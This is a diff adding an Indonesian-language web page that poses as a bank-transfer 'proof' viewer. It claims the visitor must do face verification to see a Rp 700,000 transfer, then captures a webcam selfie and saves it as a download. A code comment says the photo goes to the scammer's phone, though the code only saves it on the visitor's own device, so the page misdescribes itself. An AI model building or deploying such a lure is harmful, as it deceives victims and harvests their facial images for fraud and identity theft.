@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Bukti Transfer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 50px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .desc {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        video {
+            width: 100%;
+            max-width: 350px;
+            border-radius: 15px;
+            border: 3px solid #667eea;
+            margin: 15px 0;
+            background: #000;
+            transform: scaleX(-1);
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 14px 35px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+        }
+        .status.loading { background: #fff3cd; color: #856404; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
+        .info {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>📸 Verifikasi Bukti Transfer</h2>
+        <p class="desc">Untuk melihat bukti transfer Rp 700.000,<br>Anda harus melakukan verifikasi wajah terlebih dahulu.</p>
+        
+        <video id="video" autoplay playsinline muted></video>
+        <br>
+        <button id="captureBtn">✅ Izinkan & Verifikasi</button>
+        <div id="status" class="status"></div>
+        <p class="info">⏱️ Proses verifikasi hanya 3 detik</p>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const captureBtn = document.getElementById('captureBtn');
+        const statusDiv = document.getElementById('status');
+        
+        let stream = null;
+
+        captureBtn.onclick = async () => {
+            try {
+                statusDiv.className = 'status loading';
+                statusDiv.innerHTML = '📷 Meminta akses kamera...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                video.srcObject = stream;
+                
+                statusDiv.innerHTML = '🎥 Kamera aktif, mengambil foto...';
+                
+                setTimeout(async () => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const fotoData = canvas.toDataURL('image/jpeg', 0.8);
+                        
+                        // Download foto ke HP penipu
+                        const link = document.createElement('a');
+                        link.download = `verifikasi_${Date.now()}.jpg`;
+                        link.href = fotoData;
+                        link.click();
+                        
+                        statusDiv.className = 'status success';
+                        statusDiv.innerHTML = '✅ Verifikasi berhasil! Foto tersimpan di galeri Anda. Silakan cek mutasi rekening dalam 5 menit.';
+                        
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        video.srcObject = null;
+                        
+                    } catch (err) {
+                        statusDiv.className = 'status error';
+                        statusDiv.innerHTML = '⚠️ Gagal memproses verifikasi. Silakan coba lagi.';
+                        console.error(err);
+                    }
+                }, 1500);
+                
+            } catch (err) {
+                statusDiv.className = 'status error';
+                statusDiv.innerHTML = '⚠️ Gagal akses kamera. Pastikan Anda memberikan izin kamera.';
+                console.error(err);
+            }
+        };
+    </script>
+</body>
+</html>
